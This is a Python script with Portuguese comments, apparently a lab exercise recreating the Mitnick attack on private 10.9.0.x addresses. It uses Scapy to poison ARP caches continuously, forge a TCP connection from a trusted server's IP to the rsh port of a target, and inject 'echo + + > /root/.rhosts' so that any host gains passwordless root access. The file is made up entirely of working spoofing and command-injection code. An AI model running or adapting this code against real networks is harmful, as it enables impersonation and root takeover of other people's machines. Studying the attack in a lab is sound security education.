import scapy.all as scapy

def arp_spoof(end_mac, ip_fingido, ip_enganado, interface):
    """
    Realiza o ARP spoofing dizendo que o ip_fingido está relacionado ao end_mac para a máquina ip_enganado.

    Args:
        end_mac (str): Endereço MAC do atacante.
        ip_fingido (str): IP que está sendo fingido.
        ip_enganado (str): IP da máquina alvo que será enganada.
        interface (str): Interface de rede usada para enviar os pacotes.
    """
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Modo de transmissão é broadcast
    arp = scapy.ARP(op=1, pdst=ip_enganado, psrc=ip_fingido, hwdst=end_mac)
    pacote = broadcast/arp
    scapy.sendp(pacote, iface=interface, verbose=0)

def arp_spoofing(interface, mac_local):
    """
    Realiza o ARP spoofing contínuo para enganar o x_terminal e o servidor.

    Args:
        interface (str): Interface de rede usada para enviar os pacotes.
        mac_local (str): Endereço MAC local do atacante.
    """
    serv_ip = "10.9.0.6"
    x_term_ip = "10.9.0.5"
    while True:
        arp_spoof(mac_local, serv_ip, x_term_ip, interface)
        # Usa a tabela criada na main
        arp_spoof("00:00:00:00:00:00", x_term_ip, serv_ip, interface)

def invade(interface):
    """
    Faz a conexão TCP e manda uma requisição RSH com o comando 'echo + +' para o x_terminal.

    Args:
        interface (str): Interface de rede usada para enviar os pacotes.
    """
    IP = scapy.IP(dst='10.9.0.5', src='10.9.0.6')
    sequencia = 1400
    sport = 1023  # Porta de origem padrão do RFC
    dport = 514   # Porta de destino padrão do RFC

    # Faz a conexão TCP (envia SYN, recebe SYN-ACK, envia ACK)
    TCP = scapy.TCP(sport=sport, dport=dport, flags='S', seq=sequencia)
    syn_pacote = IP/TCP
    resposta_syn = scapy.sr1(syn_pacote, iface=interface, verbose=0)

    TCP = scapy.TCP(sport=sport, dport=dport, flags='A', seq=sequencia+1, ack=resposta_syn.seq + 1)
    pacote_ack = IP/TCP
    scapy.send(pacote_ack, verbose=0)

    # Faz a conexão do RSH (envia ACK e SYN-ACK)
    porta = '3333'
    caminho = '\x00root\x00root\x00'  # Comunicação root a root
    comando = 'echo + + > /root/.rhosts'  # Comando echo
    flag_comando = '\x00'
    instrucao = porta + caminho + comando + flag_comando
    pacote_instrucao = scapy.Raw(load=instrucao)
    TCP = scapy.TCP(sport=sport, dport=dport, flags='A', seq=sequencia +1, ack=resposta_syn.seq +1)
    pacote_rsh = IP/TCP/pacote_instrucao
    scapy.send(pacote_rsh, verbose=0)



    # Envia pacote SYN-ACK
    resposta_sniff = scapy.sniff(count=1, iface=interface, filter="tcp and src host 10.9.0.5")
    TCP = scapy.TCP(sport=3333, dport=sport, flags='SA', seq=3030, ack=resposta_sniff[0].seq + 1)
    pacote_syn_ack = IP/TCP
    scapy.send(pacote_syn_ack, verbose=0)